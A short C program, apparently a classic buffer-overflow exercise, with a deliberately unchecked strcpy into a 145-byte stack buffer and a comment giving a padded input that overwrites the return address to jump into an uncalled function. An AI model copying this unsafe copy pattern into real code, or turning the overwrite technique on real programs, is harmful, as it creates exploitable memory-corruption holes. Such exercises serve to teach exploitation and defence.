#include<stdio.h>
#include<string.h>

void dead()
{
	puts("Deadcode activated");
}

void copy(char* str)
{
	char buffer[145];
	strcpy(buffer, str);
}

int main(int argc, char** argv)
{
	copy(argv[1]);
	return 0;
}

// Command to run dead code
// run $(python -c 'print("A"*145 + "A"*4 + "\x3b\x84\x04\x08")')

